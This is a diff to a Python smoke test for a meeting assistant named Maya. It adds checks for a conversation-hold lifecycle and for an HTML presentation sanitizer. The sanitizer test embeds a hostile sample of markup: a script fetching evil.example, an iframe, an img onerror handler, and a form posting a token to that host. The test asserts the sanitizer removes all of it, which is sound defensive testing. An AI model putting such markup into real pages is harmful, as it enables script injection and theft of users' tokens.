@@ -14,6 +14,7 @@ if str(_w4_root) not in _w4_sys.path:
 del _w4_Path, _w4_root, _w4_sys
 
 from maya_core.storage import init_db
+from maya_meet.presentation_sanitizer import sanitize_presentation_html
 from maya_meet.responder import MeetM1Responder, PRIVATE_ROOM_REFUSAL
 
 
@@ -39,13 +40,17 @@ async def main() -> None:
             approval_sender=_capture_approval(approvals),
             m2_enabled=True,
             answerer=_private_answerer,
+            hold_enabled=True,
+            hold_idle_seconds=0.05,
         )
 
         await _context_hold_and_echo(responder, queue)
+        await _conversation_hold_lifecycle(responder, queue, actions)
         await _contained_action_path(responder, queue, actions)
         await _must_not_act_and_disclosure_paths(responder, queue, approvals, actions)
         await _private_answer_material_is_room_safe(responder, queue)
-        _presentation_sanitizer_deferred_marker()
+        _presentation_sanitizer_blocks_active_markup()
+        _presentation_sanitizer_blocks_private_material()
     print("meet_synthetic_feature_smoke: ok")
 
 
@@ -71,6 +76,36 @@ async def _contained_action_path(
     _require(result["status"] == "queued", str(result))
     _require(actions.calls[-1][1] == "lookup", str(actions.calls))
     _require("ran the browser action" in queue.previews[-1].lower(), queue.previews[-1])
+
+
+async def _conversation_hold_lifecycle(
+    responder: MeetM1Responder,
+    queue: _FakeOutputQueue,
+    actions: _FakeActionRunner,
+) -> None:
+    opened = await responder.process_verified_event({"text": "Maya, summarize the last point"})
+    _require(opened["status"] == "queued", str(opened))
+    followup = await responder.process_verified_event({"text": "what did they just say?"})
+    _require(followup["status"] == "queued", str(followup))
+    _require("last spoken sentence" in queue.previews[-1].lower(), queue.previews[-1])
+
+    before_actions = len(actions.calls)
+    mid_hold_action = await responder.process_verified_event({"text": "send this to the client"})
+    _require(mid_hold_action["status"] == "queued", str(mid_hold_action))
+    _require(len(actions.calls) == before_actions, "hold changed room authority")
+    _require("approval" in queue.previews[-1].lower(), queue.previews[-1])
+
+    closed = await responder.process_verified_event({"text": "thank you Maya"})
+    _require(closed["reason_code"] == "conversation_hold_closed", str(closed))
+    ignored = await responder.process_verified_event({"text": "what was the last point?"})
+    _require(ignored["status"] == "ignored", str(ignored))
+
+    reopened = await responder.process_verified_event({"text": "Maya, summarize the last point"})
+    _require(reopened["status"] == "queued", str(reopened))
+    await asyncio.sleep(0.07)
+    idle = await responder.process_verified_event({"text": "what did they just say?"})
+    _require(idle["status"] == "ignored", str(idle))
+    _require(idle["reason_code"] == "conversation_hold_idle_timeout", str(idle))
 
 
 async def _must_not_act_and_disclosure_paths(
@@ -102,11 +137,34 @@ async def _private_answer_material_is_room_safe(responder: MeetM1Responder, queu
     _require(queue.previews[-1] == PRIVATE_ROOM_REFUSAL, queue.previews[-1])
 
 
-def _presentation_sanitizer_deferred_marker() -> None:
-    # The current Meet runtime has no room-presentation executor in this slice.
-    # This smoke intentionally covers the deterministic responder/policy surface
-    # and leaves presentation sanitization to the future executor test.
-    return None
+def _presentation_sanitizer_blocks_active_markup() -> None:
+    payload = """
+    <section onclick="steal()">
+      <h1>Quarterly plan</h1>
+      <script>fetch('https://evil.example/ping')</script>
+      <iframe src="https://evil.example/frame"></iframe>
+      <img src="https://evil.example/pixel.png" onerror="steal()">
+      <form action="https://evil.example/post"><input name="token" value="abc"></form>
+      <a href="https://evil.example">remote</a>
+      <p>Keep this inert text.</p>
+    </section>
+    """
+    result = sanitize_presentation_html(payload)
+    lowered = result.html.lower()
+    _require("quarterly plan" in lowered and "keep this inert text" in lowered, result.html)
+    for forbidden in ("<script", "<iframe", "<form", "<img", "onclick", "onerror", "https://evil.example"):
+        _require(forbidden not in lowered, f"sanitizer leaked {forbidden}: {result.html}")
+    _require({"script", "iframe", "form"} <= set(result.removed_tags), str(result.removed_tags))
+    _require(any(item.endswith(".src") for item in result.removed_attrs), str(result.removed_attrs))
+
+
+def _presentation_sanitizer_blocks_private_material() -> None:
+    result = sanitize_presentation_html("<p>My private password is secret-123456.</p>")
+    _require(result.blocked_private, str(result))
+    _require("secret-123456" not in result.html, result.html)
+    approved = sanitize_presentation_html("<p>Release notes only.</p>", disclosure_approved=True)
+    _require(not approved.blocked_private, str(approved))
+    _require("release notes only" in approved.html.lower(), approved.html)
 
 
 async def _private_answerer(_prompt: str, _context: list[str]) -> str:
